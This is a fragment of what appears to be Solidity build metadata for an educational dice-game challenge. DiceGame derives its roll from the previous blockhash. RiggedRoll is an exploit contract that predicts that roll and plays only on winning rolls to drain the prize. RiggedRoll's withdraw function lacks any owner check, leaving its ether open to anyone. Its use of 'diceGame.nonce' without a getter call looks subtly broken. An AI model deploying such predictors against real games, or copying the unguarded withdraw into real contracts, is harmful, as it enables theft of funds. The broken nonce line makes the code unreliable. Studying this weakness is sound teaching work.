","keccak256":"0x90565a39ae45c80f0468dc96c7b20d0afc3055f344c8203a0c9258239f350b9f","license":"MIT"},"contracts/DiceGame.sol":{"content":"pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import 'hardhat/console.sol';

contract DiceGame {
  uint256 public nonce = 0;
  uint256 public prize = 0;

  event Roll(address indexed player, uint256 roll);
  event Winner(address winner, uint256 amount);

  constructor() payable {
    resetPrize();
  }

  function resetPrize() private {
    prize = ((address(this).balance * 10) / 100);
  }

  function rollTheDice() public payable {
    require(msg.value >= 0.002 ether, 'Failed to send enough value');

    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
    uint256 roll = uint256(hash) % 16;

    console.log('THE ROLL IS ', roll);

    nonce++;
    prize += ((msg.value * 40) / 100);

    emit Roll(msg.sender, roll);

    if (roll > 2) {
      return;
    }

    uint256 amount = prize;
    (bool sent, ) = msg.sender.call{value: amount}('');
    require(sent, 'Failed to send Ether');

    resetPrize();
    emit Winner(msg.sender, amount);
  }

  receive() external payable {}
}
","keccak256":"0x22800879d6f572db9c7e5e76d31fcc1046b1abab0302b87bfda35dbb32ca27d1","license":"MIT"},"contracts/RiggedRoll.sol":{"content":"pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import 'hardhat/console.sol';
import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract RiggedRoll is Ownable {
  DiceGame public diceGame;
  address private dAddress;

  constructor(address payable diceGameAddress) {
    diceGame = DiceGame(diceGameAddress);
    dAddress = diceGameAddress;
  }

  //Add withdraw function to transfer ether from the rigged contract to an address
  function withdraw(address _addr, uint256 _amount) external {
    uint256 balance = address(this).balance;
    require(balance >= _amount);
    (bool sent, ) = _addr.call{value: _amount}('');
    require(sent, 'Failed to withdraw Ether');
  }

  //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
  function riggedRoll() external {
    uint256 balance = address(this).balance;
    require(balance >= 0.002 ether, 'Failed to send enough value');

    bytes32 prevHash = blockhash(block.number - 1);
    bytes32 hash = keccak256(abi.encodePacked(prevHash, dAddress, diceGame.nonce));
    uint256 roll = uint256(hash) % 16;

    console.log('THE ROLL IS ', roll);
    require(roll <= 2);
    diceGame.rollTheDice{value: 0.002 ether}();
  }

  //Add receive() function so contract can receive Eth
  receive() external payable {}
}
